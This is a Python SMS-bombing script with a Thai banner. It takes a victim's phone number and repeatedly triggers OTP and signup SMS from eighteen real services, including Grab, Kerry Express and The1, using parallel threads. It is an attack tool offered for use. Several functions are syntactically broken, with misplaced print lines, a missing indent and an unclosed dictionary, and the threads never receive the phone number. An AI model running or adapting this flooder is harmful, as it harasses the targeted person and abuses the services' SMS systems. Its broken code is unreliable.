import requests
from requests import post,Session
import sys
import threading
from re import search
phone = ""
amount = ""


if len(sys.argv)==3:
	phone = sys.argv[1]
	amount = int(sys.argv[2])

else:
	print("""
╔═══╗╔═══╗    
║╔══╝║╔══╝    
║╚══╗║╚══╗╔══╗
║╔══╝║╔══╝║══╣
║╚══╗║╚══╗╠══║
╚═══╝╚═══╝╚══╝
Spam Sms By : อ้นกี้😏
[FB]  : AONKY

	""")

	print("วิธีใช้   : python spamArgv.py <เบอร์> <จำนวน>" )
	sys.exit(1)






useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def sk1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})
    print (f"Send number {phone} | Success ✓")

def sk2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
print (f"Send number {phone} | Success ✓")

def sk3(phone):
    post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
print (f"Send number {phone} | Success ✓")

def sk4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})
print (f"Send number {phone} | Success ✓")

def sk5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
print (f"Send number {phone} | Success ✓")

def sk6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"+66{phone[1:]}","password":"","client":"ecommerce"})
print (f"Send number {phone} | Success ✓")

def sk7(phone):
    post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})
print (f"Send number {phone} | Success ✓")

def sk8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})
print (f"Send number {phone} | Success ✓")
def sk9(phone):
post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})
print (f"Send number {phone} | Success ✓")

def sk10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone":
print (f"Send number {phone} | Success ✓")

def sk11(phone):
    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
print (f"Send number {phone} | Success ✓")

def sk12(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
print (f"Send number {phone} | Success ✓")

def sk13(phone):
    post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
print (f"Send number {phone} | Success ✓")

def sk14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
print (f"Send number {phone} | Success ✓")

def sk15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})
print (f"Send number {phone} | Success ✓")

def sk16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})
print (f"Send number {phone} | Success ✓")

def sk17(phone):
    post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
print (f"Send number {phone} | Success ✓")

def sk18(phone):
    post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})
print (f"Send number {phone} | Success ✓")














for i in range(amount):
	threading.Thread(target=sk1).start()
	threading.Thread(target=sk2).start()
	threading.Thread(target=sk3).start()
	threading.Thread(target=sk4).start()
	threading.Thread(target=sk5).start()
	threading.Thread(target=sk6).start()
	threading.Thread(target=sk7).start()
	threading.Thread(target=sk8).start()
	threading.Thread(target=sk9).start()
	threading.Thread(target=sk10).start()
	threading.Thread(target=sk11).start()
	threading.Thread(target=sk12).start()
	threading.Thread(target=sk13).start()
	threading.Thread(target=sk14).start()
	threading.Thread(target=sk15).start()
	threading.Thread(target=sk16).start()
	threading.Thread(target=sk17).start()
	threading.Thread(target=sk18).start()









